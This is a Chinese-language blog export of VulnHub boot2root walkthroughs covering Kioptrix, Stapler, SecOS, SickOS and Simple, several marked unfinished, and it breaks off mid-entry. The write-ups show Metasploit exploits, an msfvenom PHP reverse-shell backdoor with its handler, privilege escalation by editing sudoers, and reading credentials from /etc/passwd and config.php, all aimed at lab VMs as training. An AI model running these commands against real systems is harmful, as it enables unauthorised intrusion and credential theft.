loneferret@192.168.111.186</span><br></pre></td></tr></table></figure><blockquote><p>登录成功</p></blockquote><p>![image-20220608140050147](12.Hack the Kioptrix Level-1.2 (Boot2Root Challenge).assets&#x2F;image-20220608140050147.png)</p><blockquote><p>查看系统信息</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br><span class="line">cat</span><br></pre></td></tr></table></figure><p>![image-20220608140317656](12.Hack the Kioptrix Level-1.2 (Boot2Root Challenge).assets&#x2F;image-20220608140317656.png)</p><blockquote><p>列出当前用户可执行的指令</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p>![image-20220608140415878](12.Hack the Kioptrix Level-1.2 (Boot2Root Challenge).assets&#x2F;image-20220608140415878.png)</p><blockquote><p><strong>sudo ht</strong>将允许编辑系统上的任何文件。因此，我们将编辑 &#x2F;etc&#x2F;sudoers 文件。在编辑 sudoers 文件之前，请确保导出 TERM，以便我们可以使用命令的图形组件</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export TERM=xterm-color</span><br><span class="line">sudo ht /etc/sudoers</span><br></pre></td></tr></table></figure><p>![image-20220608141324365](12.Hack the Kioptrix Level-1.2 (Boot2Root Challenge).assets&#x2F;image-20220608141324365.png)</p><p>![image-20220608145932898](12.Hack the Kioptrix Level-1.2 (Boot2Root Challenge).assets&#x2F;image-20220608145932898.png)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">loneferret ALL=NOPASSSWD: !/usr/bin/su, /usr/local/bin/ht</span><br></pre></td></tr></table></figure><blockquote><p>上面的改成下面的</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">loneferret ALL=(ALL) NOPASSWD: ALL</span><br></pre></td></tr></table></figure><blockquote><p>提权成功</p></blockquote><p>![image-20220608150306626](12.Hack the Kioptrix Level-1.2 (Boot2Root Challenge).assets&#x2F;image-20220608150306626.png)</p><h2 id="3-获得root权限挑战结束"><a href="#3-获得root权限挑战结束" class="headerlink" title="3.获得root权限挑战结束"></a>3.获得root权限挑战结束</h2>]]></content>
      
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>14.Hack the Kioptrix 5 (CTF Challenge)</title>
      <link href="/2022/06/19/14.Hack%20the%20Kioptrix%205%20(CTF%20Challenge)/"/>
      <url>/2022/06/19/14.Hack%20the%20Kioptrix%205%20(CTF%20Challenge)/</url>
      
        <content type="html"><![CDATA[<h1 id="Hack-the-Kioptrix-5-CTF-Challenge"><a href="#Hack-the-Kioptrix-5-CTF-Challenge" class="headerlink" title="Hack the Kioptrix 5 (CTF Challenge)"></a>Hack the Kioptrix 5 (CTF Challenge)</h1><blockquote><p>镜像地址：<a href="https://www.vulnhub.com/entry/kioptrix-2014-5,62/">https://www.vulnhub.com/entry/kioptrix-2014-5,62/</a></p></blockquote><h1 id="1-渗透方法"><a href="#1-渗透方法" class="headerlink" title="1.渗透方法"></a>1.渗透方法</h1><ul><li>网络扫描（Nmap、netdiscover）</li><li>冲浪 HTTP 服务端口（80 和 8080）</li><li>识别易受攻击的 Web 应用程序的利用</li><li>通过 Metasploit 攻击目标</li><li>获取 Root 访问权限并捕获标志</li></ul><h2 id="2-渗透流程"><a href="#2-渗透流程" class="headerlink" title="2.渗透流程"></a>2.渗透流程</h2><h3 id="2-1局域网发现目标主机"><a href="#2-1局域网发现目标主机" class="headerlink" title="2.1局域网发现目标主机"></a>2.1局域网发现目标主机</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -i eth0 -r 192.168.47.0/24  # 具体网段参照ifconfig</span><br></pre></td></tr></table></figure><blockquote><p>发现目标主机ip  192.168.47.86</p></blockquote><p>![image-20220609091344367](14.Hack the Kioptrix 5 (CTF Challenge).assets&#x2F;image-20220609091344367.png)</p><h3 id="2-2nmap扫描并发现目标ip的端口和服务"><a href="#2-2nmap扫描并发现目标ip的端口和服务" class="headerlink" title="2.2nmap扫描并发现目标ip的端口和服务"></a>2.2nmap扫描并发现目标ip的端口和服务</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -A 192.168.47.86</span><br><span class="line">nmap -Pn -sV 192.168.47.86</span><br></pre></td></tr></table></figure><p>![image-20220609091640282](14.Hack the Kioptrix 5 (CTF Challenge).assets&#x2F;image-20220609091640282.png)</p><p>![image-20220609091757586](14.Hack the Kioptrix 5 (CTF Challenge).assets&#x2F;image-20220609091757586.png)</p><blockquote><p>发现开放端口 22,80,8080</p></blockquote><h3 id="2-3-测试http服务"><a href="#2-3-测试http服务" class="headerlink" title="2.3 测试http服务"></a>2.3 测试http服务</h3><p>![image-20220609091946647](14.Hack the Kioptrix 5 (CTF Challenge).assets&#x2F;image-20220609091946647-16547375873871.png)</p><blockquote><p> HTTP 服务也在监听 8080 端口。于是我打开了8080端口的IP</p></blockquote><p>![image-20220609092010480](14.Hack the Kioptrix 5 (CTF Challenge).assets&#x2F;image-20220609092010480.png)</p><blockquote><p>访问被禁止；但是，该消息在我看来并不是错误消息。它似乎更像是一条经过深思熟虑和故意编造的回应。我尝试了所有方法来绕过这个被禁止的访问，但没有任何效果。因此，我决定使用用户代理切换器在其他流行的浏览器（如 Internet Explorer）中检查此页面</p></blockquote><blockquote><p>安装<strong>User Agent Switcher</strong>浏览器插件</p></blockquote><p>![image-20220609093033646](14.Hack the Kioptrix 5 (CTF Challenge).assets&#x2F;image-20220609093033646.png)</p><blockquote><p>从<strong>菜单栏</strong>导航到<strong>工具菜单</strong>。将出现一个下拉菜单。从此菜单中选择<strong>默认用户代理</strong>。将打开另一个菜单并从中选择<strong>Internet Explorer</strong>，然后将打开另一个菜单并从中选择<strong>Internet Explorer 6</strong></p></blockquote><p>![image-20220609093103523](14.Hack the Kioptrix 5 (CTF Challenge).assets&#x2F;image-20220609093103523.png)</p><blockquote><p>发现应该是UA头被过滤了</p></blockquote><blockquote><p>点击链接进行访问</p></blockquote><p>![image-20220609093244223](14.Hack the Kioptrix 5 (CTF Challenge).assets&#x2F;image-20220609093244223.png)</p><blockquote><p>发现已经知道的cms</p></blockquote><h3 id="2-4-Metasploit-反弹shell"><a href="#2-4-Metasploit-反弹shell" class="headerlink" title="2.4 Metasploit 反弹shell"></a>2.4 Metasploit 反弹shell</h3><blockquote><p>页面是phptax。Phptax 是一种适用于 Linux 操作系统的 CMS。其目的是开发一种税收程序，该程序使用适合单行文本文件的无数据库方法。使用 phptax 不需要此程序中通常使用的 SQL 数据库。幸运的是，Metasploit 中存在 phptax 漏洞利用，只需在 Metasploit MSF 控制台中键入<strong>search phptax</strong></p></blockquote><p>![image-20220609093842589](14.Hack the Kioptrix 5 (CTF Challenge).assets&#x2F;image-20220609093842589.png)</p><blockquote><p>这两项必须设置</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/http/phptax_exec</span><br><span class="line">msf exploit(phptax_exec) &gt; set rhost 192.168.1.159</span><br><span class="line">msf exploit(phptax_exec) &gt; set rport 8080</span><br><span class="line">msf exploit(phptax_exec) &gt; exploit</span><br></pre></td></tr></table></figure><p>![image-20220609101615354](14.Hack the Kioptrix 5 (CTF Challenge).assets&#x2F;image-20220609101615354.png)</p><h2 id="未完"><a href="#未完" class="headerlink" title="未完"></a>未完</h2>]]></content>
      
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>16.Hack the Stapler VM (CTF Challenge)</title>
      <link href="/2022/06/19/16.Hack%20the%20Stapler%20VM%20(CTF%20Challenge)/"/>
      <url>/2022/06/19/16.Hack%20the%20Stapler%20VM%20(CTF%20Challenge)/</url>
      
        <content type="html"><![CDATA[<h1 id="Hack-the-Stapler-VM-CTF-Challenge"><a href="#Hack-the-Stapler-VM-CTF-Challenge" class="headerlink" title="Hack the Stapler VM (CTF Challenge)"></a>Hack the Stapler VM (CTF Challenge)</h1><blockquote><p>镜像地址：<a href="https://www.vulnhub.com/entry/stapler-1,150/">https://www.vulnhub.com/entry/stapler-1,150/</a></p></blockquote><h2 id="1-渗透方法"><a href="#1-渗透方法" class="headerlink" title="1.渗透方法"></a>1.渗透方法</h2><ul><li>网络扫描（Nmap、netdiscover）</li><li>枚举（robot.txt）</li><li>WordPress扫描和密码破解（wpscan）</li><li>登录 WordPress</li><li>生成 PHP 后门 (Msfvenom)</li><li>上传并执行后门</li><li>反向连接（Metasploit）</li><li>为正确的 TTY shell 导入 python one-liner</li><li>内核提权</li><li>获取 Root 访问权限并捕获标志</li></ul><h2 id="2-渗透流程"><a href="#2-渗透流程" class="headerlink" title="2.渗透流程"></a>2.渗透流程</h2><h3 id="2-1局域网寻找目标ip"><a href="#2-1局域网寻找目标ip" class="headerlink" title="2.1局域网寻找目标ip"></a>2.1局域网寻找目标ip</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -i eth0 -r 192.168.1.0/24</span><br></pre></td></tr></table></figure><p>![image-20220609120957043](16.Hack the Stapler VM (CTF Challenge).assets&#x2F;image-20220609120957043.png)</p><h3 id="2-2-nmap扫描目标端口和服务"><a href="#2-2-nmap扫描目标端口和服务" class="headerlink" title="2.2 nmap扫描目标端口和服务"></a>2.2 nmap扫描目标端口和服务</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -A192.168.1.238</span><br><span class="line">nmap -Pn -sV 192.168.1.238</span><br></pre></td></tr></table></figure><p>![image-20220609121036892](16.Hack the Stapler VM (CTF Challenge).assets&#x2F;image-20220609121036892.png)</p><p>![image-20220609121248160](16.Hack the Stapler VM (CTF Challenge).assets&#x2F;image-20220609121248160.png)</p><blockquote><p>信息太多，截图截的不全</p></blockquote><blockquote><p>发现端口20,21,22,53,80,139,666,3306</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- 192.168.1.238</span><br></pre></td></tr></table></figure><blockquote><p>果然刚才存在漏扫问题</p></blockquote><p>![image-20220609122139470](16.Hack the Stapler VM (CTF Challenge).assets&#x2F;image-20220609122139470.png)</p><h3 id="2-3尝试访问12380端口"><a href="#2-3尝试访问12380端口" class="headerlink" title="2.3尝试访问12380端口"></a>2.3尝试访问12380端口</h3><p>![image-20220609123519240](16.Hack the Stapler VM (CTF Challenge).assets&#x2F;image-20220609123519240.png)</p><h3 id="2-4-dirb-进行目录爆破"><a href="#2-4-dirb-进行目录爆破" class="headerlink" title="2.4 dirb 进行目录爆破"></a>2.4 dirb 进行目录爆破</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.1.238:12380</span><br></pre></td></tr></table></figure><p>![image-20220609124042753](16.Hack the Stapler VM (CTF Challenge).assets&#x2F;image-20220609124042753.png)</p><blockquote><p>没找到有价值的目录</p></blockquote><h2 id="未完"><a href="#未完" class="headerlink" title="未完"></a>未完</h2>]]></content>
      
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>15.Hack the SecOS:1 (CTF Challenge)</title>
      <link href="/2022/06/19/15.Hack%20the%20SecOS1%20(CTF%20Challenge)/"/>
      <url>/2022/06/19/15.Hack%20the%20SecOS1%20(CTF%20Challenge)/</url>
      
        <content type="html"><![CDATA[<h1 id="Hack-the-SecOS-1-CTF-Challenge"><a href="#Hack-the-SecOS-1-CTF-Challenge" class="headerlink" title="Hack the SecOS:1 (CTF Challenge)"></a>Hack the SecOS:1 (CTF Challenge)</h1><blockquote><p>镜像地址：<a href="https://download.vulnhub.com/secos/SecOS-1.tar.gz">https://download.vulnhub.com/secos/SecOS-1.tar.gz</a></p></blockquote><h2 id="1-渗透方法"><a href="#1-渗透方法" class="headerlink" title="1.渗透方法"></a>1.渗透方法</h2><ul><li>IP 发现和端口扫描</li><li>运行网络应用程序</li><li>对管理员运行 CSRF 攻击</li><li>通过向管理员发送消息来欺骗管理员访问虚假页面</li><li>等待几分钟让管理员访问该页面</li><li>使用这些获取凭据并登录 SSH</li><li>在系统上运行 overlayfs</li><li>获得root权限！</li></ul><h2 id="2-渗透流程"><a href="#2-渗透流程" class="headerlink" title="2.渗透流程"></a>2.渗透流程</h2><h3 id="2-1局域网寻找目标ip"><a href="#2-1局域网寻找目标ip" class="headerlink" title="2.1局域网寻找目标ip"></a>2.1局域网寻找目标ip</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -i eth0 -r 192.168.1.0/24</span><br></pre></td></tr></table></figure><p>![image-20220609104946012](15.Hack the SecOS1 (CTF Challenge).assets&#x2F;image-20220609104946012.png)</p><h3 id="2-2-nmap扫描目标端口和服务"><a href="#2-2-nmap扫描目标端口和服务" class="headerlink" title="2.2 nmap扫描目标端口和服务"></a>2.2 nmap扫描目标端口和服务</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -A192.168.1.130</span><br><span class="line">nmap -Pn -sV 192.168.1.130</span><br></pre></td></tr></table></figure><p>![image-20220609105148701](15.Hack the SecOS1 (CTF Challenge).assets&#x2F;image-20220609105148701.png)</p><p>![image-20220609105242133](15.Hack the SecOS1 (CTF Challenge).assets&#x2F;image-20220609105242133.png)</p><blockquote><p>发现端口22,8081</p></blockquote><h3 id="2-3-测试http服务"><a href="#2-3-测试http服务" class="headerlink" title="2.3 测试http服务"></a>2.3 测试http服务</h3><blockquote><p>发现目标站点</p></blockquote><p>![image-20220609105447679](15.Hack the SecOS1 (CTF Challenge).assets&#x2F;image-20220609105447679.png)</p><blockquote><p>第一个提示是显示的消息——“Secure Web App 是名为 secOS-1 的易受攻击 VM 的一部分”</p><p>因此，我们推断该 VM 具有基于 Web 的漏洞。下一步是运行 Nikto 扫描，它也没有产生太多信息。</p></blockquote><h3 id="2-4-dirb-目录爆破"><a href="#2-4-dirb-目录爆破" class="headerlink" title="2.4 dirb 目录爆破"></a>2.4 dirb 目录爆破</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.1.130:8081</span><br></pre></td></tr></table></figure><p>![image-20220609105736281](15.Hack the SecOS1 (CTF Challenge).assets&#x2F;image-20220609105736281.png)</p><blockquote><p>Web 易受攻击的应用程序中的登录页面意味着通往 shell 的路线！</p></blockquote><p>![image-20220609105909098](15.Hack the SecOS1 (CTF Challenge).assets&#x2F;image-20220609105909098.png)</p><blockquote><p>不行，去注册页面</p></blockquote><blockquote><p>注册一个账户成功登录进来开始下一步</p></blockquote><p>![image-20220609110141059](15.Hack the SecOS1 (CTF Challenge).assets&#x2F;image-20220609110141059.png)</p><blockquote><p>发现管理员账户</p></blockquote><p>![image-20220609110503209](15.Hack the SecOS1 (CTF Challenge).assets&#x2F;image-20220609110503209.png)</p><h2 id="未完"><a href="#未完" class="headerlink" title="未完"></a>未完</h2>]]></content>
      
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>17.Hack the SickOS 1.1 VM (CTF Challenge)</title>
      <link href="/2022/06/19/17.Hack%20the%20SickOS%201.1%20VM%20(CTF%20Challenge)/"/>
      <url>/2022/06/19/17.Hack%20the%20SickOS%201.1%20VM%20(CTF%20Challenge)/</url>
      
        <content type="html"><![CDATA[<h1 id="Hack-the-SickOS-1-1-VM-CTF-Challenge"><a href="#Hack-the-SickOS-1-1-VM-CTF-Challenge" class="headerlink" title="Hack the SickOS 1.1 VM (CTF Challenge)"></a>Hack the SickOS 1.1 VM (CTF Challenge)</h1><blockquote><p>镜像地址：<a href="https://www.vulnhub.com/entry/sickos-11,132/">https://www.vulnhub.com/entry/sickos-11,132/</a></p></blockquote><h2 id="1-渗透方法"><a href="#1-渗透方法" class="headerlink" title="1.渗透方法"></a>1.渗透方法</h2><ul><li>网络扫描（Netdiscover、Nmap）</li><li>配置浏览器代理</li><li>使用机器人.txt</li><li>搜索 Wolf CMS 管理员登录页面和默认凭据 (Google)</li><li>进入管理控制台</li><li>生成 PHP 后门 (Msfvenom)</li><li>上传并执行后门</li><li>反向连接（Metasploit）</li><li>从 config.php 中窃取密码</li><li>进入 shell 进行权限提升</li><li>为正确的 TTY shell 导入 python one-liner</li><li>打开等&#x2F;密码</li><li>切换用户（su）并提交被盗密码</li><li>获取 root 访问权限</li></ul><h2 id="2-渗透流程"><a href="#2-渗透流程" class="headerlink" title="2.渗透流程"></a>2.渗透流程</h2><h3 id="2-1网络扫描（Netdiscover、Nmap）"><a href="#2-1网络扫描（Netdiscover、Nmap）" class="headerlink" title="2.1网络扫描（Netdiscover、Nmap）"></a>2.1网络扫描（Netdiscover、Nmap）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -i eth0 -r 192.168.1.0/24</span><br></pre></td></tr></table></figure><p>![image-20220609135500923](17.Hack the SickOS 1.1 VM (CTF Challenge).assets&#x2F;image-20220609135500923.png)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- -A 192.168.1.239</span><br></pre></td></tr></table></figure><p>![image-20220609140047230](17.Hack the SickOS 1.1 VM (CTF Challenge).assets&#x2F;image-20220609140047230.png)</p><h3 id="2-2配置浏览器代理"><a href="#2-2配置浏览器代理" class="headerlink" title="2.2配置浏览器代理"></a>2.2配置浏览器代理</h3><blockquote><p>因为<strong>在 nmap 期间观察到3128</strong>上有一些关于代理的内容 。因此，我们将尝试设置 <strong>手动代理</strong>。<strong>给出HTTP 代理</strong>中 VM 的 IP 和<strong>端口 3128</strong></p></blockquote><p>![image-20220609140227742](17.Hack the SickOS 1.1 VM (CTF Challenge).assets&#x2F;image-20220609140227742.png)</p><h3 id="2-3使用robots-txt"><a href="#2-3使用robots-txt" class="headerlink" title="2.3使用robots.txt"></a>2.3使用robots.txt</h3><blockquote><p>通常，在 web 目录中总是有一些机会获得 robots.txt 文件，因此，在渗透任何系统时，我们应该始终检查 robots.txt 文件。在这里它也可以工作，它告诉我们一些关于 <strong>&#x2F;wolfcms</strong>的信息 ，这意味着这个网站是在 Wolf CMS 中制作的，或者有一个名为 <strong>&#x2F;wolfcms</strong>的目录。 </p></blockquote><p>![image-20220609140429743](17.Hack the SickOS 1.1 VM (CTF Challenge).assets&#x2F;image-20220609140429743.png)</p><blockquote><p>已知cms建站系统</p></blockquote><h3 id="2-4搜索-Wolf-CMS-管理员登录页面和默认凭据-Google"><a href="#2-4搜索-Wolf-CMS-管理员登录页面和默认凭据-Google" class="headerlink" title="2.4搜索 Wolf CMS 管理员登录页面和默认凭据 (Google)"></a>2.4搜索 Wolf CMS 管理员登录页面和默认凭据 (Google)</h3><blockquote><p>在浏览器中打开它作为链接： **192.168.1.239&#x2F;wolfcms&#x2F;**，页面将打开如下，表明它是在Wolf CMS中制作的。</p></blockquote><p>![image-20220609140646194](17.Hack the SickOS 1.1 VM (CTF Challenge).assets&#x2F;image-20220609140646194.png)</p><blockquote><p>我对 Wolf CMS 了解不多，所以我搜索了 Google 以了解 <strong>管理页面</strong> 所在的位置。当我通过谷歌找到登录页面时，我打开了它。它要求我输入用户名和密码。默认<strong>情况下，</strong>用户名和密码分别是<strong>admin</strong>和<strong>admin</strong>，我登录到管理控制台，然后选择文件选项卡，然后选择上传文件选项。</p></blockquote><h3 id="2-5进入管理控制台"><a href="#2-5进入管理控制台" class="headerlink" title="2.5进入管理控制台"></a>2.5进入管理控制台</h3><p>![image-20220609140821198](17.Hack the SickOS 1.1 VM (CTF Challenge).assets&#x2F;image-20220609140821198.png)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username amdin</span><br><span class="line">password admin</span><br></pre></td></tr></table></figure><p>![image-20220609140908890](17.Hack the SickOS 1.1 VM (CTF Challenge).assets&#x2F;image-20220609140908890.png)</p><h3 id="2-6生成-PHP-后门-Msfvenom"><a href="#2-6生成-PHP-后门-Msfvenom" class="headerlink" title="2.6生成 PHP 后门 (Msfvenom)"></a>2.6生成 PHP 后门 (Msfvenom)</h3><blockquote><p>使用msf生成木马脚本，需要上传恶意脚本并生成它，在kali中打开你的终端并输入：</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.128 lport=4444 –f raw</span><br></pre></td></tr></table></figure><p>![image-20220609141252812](17.Hack the SickOS 1.1 VM (CTF Challenge).assets&#x2F;image-20220609141252812.png)</p><p>![image-20220609141450329](17.Hack the SickOS 1.1 VM (CTF Challenge).assets&#x2F;image-20220609141450329.png)</p><h3 id="2-7上传并执行后门"><a href="#2-7上传并执行后门" class="headerlink" title="2.7上传并执行后门"></a>2.7上传并执行后门</h3><p>![image-20220609141629647](17.Hack the SickOS 1.1 VM (CTF Challenge).assets&#x2F;image-20220609141629647.png)</p><blockquote><p>现在我们需要执行 shell.php 文件来获取 Metasploit 上的反向连接</p></blockquote><p>![image-20220609141748325](17.Hack the SickOS 1.1 VM (CTF Challenge).assets&#x2F;image-20220609141748325.png)</p><blockquote><p>返回 Metasploit 终端并通过利用多处理程序等待 Meterpreter 会话</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf use exploit/multi/handler</span><br><span class="line">msf exploit(multi/handler) set payload php/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(multi/handler) set lhost 192.168.1.108</span><br><span class="line">msf exploit(multi/handler) set lport 4444</span><br><span class="line">msf exploit(multi/handler) exploit</span><br></pre></td></tr></table></figure><p>![image-20220609142254864](17.Hack the SickOS 1.1 VM (CTF Challenge).assets&#x2F;image-20220609142254864.png)</p><h3 id="2-8反向连接（Metasploit）"><a href="#2-8反向连接（Metasploit）" class="headerlink" title="2.8反向连接（Metasploit）"></a>2.8反向连接（Metasploit）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysinfo</span><br></pre></td></tr></table></figure><p>![image-20220609142432410](17.Hack the SickOS 1.1 VM (CTF Challenge).assets&#x2F;image-20220609142432410.png)</p><h3 id="2-9从-config-php-中窃取密码"><a href="#2-9从-config-php-中窃取密码" class="headerlink" title="2.9从 config.php 中窃取密码"></a>2.9从 config.php 中窃取密码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwd</span><br><span class="line">ls</span><br><span class="line">cd ..</span><br><span class="line">ls</span><br></pre></td></tr></table></figure><blockquote><p>发现目标</p></blockquote><p>![image-20220609142617806](17.Hack the SickOS 1.1 VM (CTF Challenge).assets&#x2F;image-20220609142617806.png)</p><p>![image-20220609142801291](17.Hack the SickOS 1.1 VM (CTF Challenge).assets&#x2F;image-20220609142801291.png)</p><h3 id="2-10进入-shell-进行权限提升"><a href="#2-10进入-shell-进行权限提升" class="headerlink" title="2.10进入 shell 进行权限提升"></a>2.10进入 shell 进行权限提升</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure><p>![image-20220609144201811](17.Hack the SickOS 1.1 VM (CTF Challenge).assets&#x2F;image-20220609144201811.png)</p><h3 id="2-11为shell-命令导入-python-单行脚本"><a href="#2-11为shell-命令导入-python-单行脚本" class="headerlink" title="2.11为shell 命令导入 python 单行脚本"></a>2.11为shell 命令导入 python 单行脚本</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p>![image-20220609144241015](17.Hack the SickOS 1.1 VM (CTF Challenge).assets&#x2F;image-20220609144241015.png)</p><h3 id="2-12打开-x2F-etc-x2F-passwd"><a href="#2-12打开-x2F-etc-x2F-passwd" class="headerlink" title="2.12打开&#x2F;etc&#x2F;passwd"></a>2.12打开&#x2F;etc&#x2F;passwd</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure><p>![image-20220609144525974](17.Hack the SickOS 1.1 VM (CTF Challenge).assets&#x2F;image-20220609144525974.png)</p><h3 id="2-13切换用户（su）并提交被盗密码"><a href="#2-13切换用户（su）并提交被盗密码" class="headerlink" title="2.13切换用户（su）并提交被盗密码"></a>2.13切换用户（su）并提交被盗密码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su ickos</span><br><span class="line">sudo -s</span><br></pre></td></tr></table></figure><p>![image-20220609144848007](17.Hack the SickOS 1.1 VM (CTF Challenge).assets&#x2F;image-20220609144848007.png)</p><blockquote><p>成功登录该用户</p></blockquote><p>![image-20220609145133779](17.Hack the SickOS 1.1 VM (CTF Challenge).assets&#x2F;image-20220609145133779.png)</p><h3 id="2-14获取-root-访问权限"><a href="#2-14获取-root-访问权限" class="headerlink" title="2.14获取 root 访问权限"></a>2.14获取 root 访问权限</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /root</span><br><span class="line">ls</span><br></pre></td></tr></table></figure><p>![image-20220609145213141](17.Hack the SickOS 1.1 VM (CTF Challenge).assets&#x2F;image-20220609145213141.png)</p><blockquote><p>拿到root权限，挑战结束</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>19.Hack the Simple VM (CTF Challenge)</title>
      <link href="/2022/06/19/19.Hack%20the%20Simple%20VM%20(CTF%20Challenge)/"/>
      <url>/2022/06/19/19.Hack%20the%20Simple%20VM%20(CTF%20Challenge)/</url>
      
        <content type="html"><![CDATA[<h1 id="Hack-the-Simple-VM-CTF-Challenge"><a href="#Hack-the-Simple-VM-CTF-Challenge" class="headerlink" title="Hack the Simple VM (CTF Challenge)"></a>Hack the Simple VM (CTF Challenge)</h1><blockquote><p>镜像地址：<a href="https://www.vulnhub.com/entry/sectalks-bne0x03-simple,141/">https://www.vulnhub.com/entry/sectalks-bne0x03-simple,141/</a></p></blockquote><h2 id="1-渗透方法"><a href="#1-渗透方法" class="headerlink" title="1.渗透方法"></a>1.渗透方法</h2><ul><li>网络扫描（Netdiscover、Nmap）</li><li>枚举文件上传漏洞（searchsploit）</li><li>生成 PHP 后门 (Msfvenom)</li><li>上传并执行后门</li><li>反向连接（Metasploit）</li><li>为shell 导入 python bash</li><li>内核权限提升</li><li>获取 Root 访问权限并捕获标志</li></ul><h2 id="2-渗透流程"><a href="#2-渗透流程" class="headerlink" title="2.渗透流程"></a>2.渗透流程</h2><h3 id="2-1网络扫描（Netdiscover、Nmap）"><a href="#2-1网络扫描（Netdiscover、Nmap）" class="headerlink" title="2.1网络扫描（Netdiscover、Nmap）"></a>2.1网络扫描（Netdiscover、Nmap）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -i eth0 -r 192.168.1.0/24</span><br></pre></td></tr></table></figure><p>![image-20220610085612596](19.Hack the Simple VM (CTF Challenge).assets&#x2F;image-20220610085612596.png)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- -A 192.168.1.239</span><br></pre></td></tr></table></figure><p>![image-20220610085748466](19.Hack the Simple VM (CTF Challenge).assets&#x2F;image-20220610085748466.png)</p><blockquote><p>访问80端口的http服务</p></blockquote><p>![image-20220610090051233](19.Hack the Simple VM (CTF Challenge).assets&#x2F;image-20220610090051233.png)</p><blockquote><p>发现该网站使用的是现有的CMS搭建的网站(<strong>CuteNews v.2.0.3</strong>)</p><p>这里我们搜索这个CMS的利用</p></blockquote><h3 id="2-2搜索文件上传漏洞（searchsploit）"><a href="#2-2搜索文件上传漏洞（searchsploit）" class="headerlink" title="2.2搜索文件上传漏洞（searchsploit）"></a>2.2搜索文件上传漏洞（searchsploit）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 